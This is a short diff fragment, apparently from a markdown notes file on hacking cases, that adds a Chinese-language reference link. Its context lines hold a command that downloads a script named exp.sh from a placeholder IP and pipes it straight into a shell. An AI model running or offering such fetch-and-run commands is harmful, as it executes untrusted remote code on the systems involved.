@@ -126,6 +126,7 @@ or you can do that
 
 sh -c "$(wget http://x.x.x.x/exp.sh -O -)"
 
+参考链接： https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html
 ```
 ### case_for_Hack
 ```
